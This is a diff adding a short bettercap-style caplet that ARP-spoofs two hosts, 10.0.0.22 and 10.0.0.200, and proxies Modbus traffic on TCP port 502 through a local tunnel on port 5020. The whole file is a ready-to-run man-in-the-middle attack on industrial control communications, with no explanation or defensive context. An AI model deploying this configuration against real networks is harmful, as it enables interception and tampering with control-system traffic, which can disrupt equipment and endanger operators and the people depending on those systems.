@@ -1,0 +1,13 @@
+# arp.spoof configuration
+set arp.spoof.targets 10.0.0.22, 10.0.0.200
+set arp.spoof.internal true
+# tcp.proxy configuration
+set tcp.proxy.port 502
+set tcp.address 10.0.0.22
+set tcp.port 502
+set tcp.tunnel.address 127.0.0.1
+set tcp.tunnel.port 5020
+# components start
+net.probe on
+arp.spoof on
+tcp.proxy on
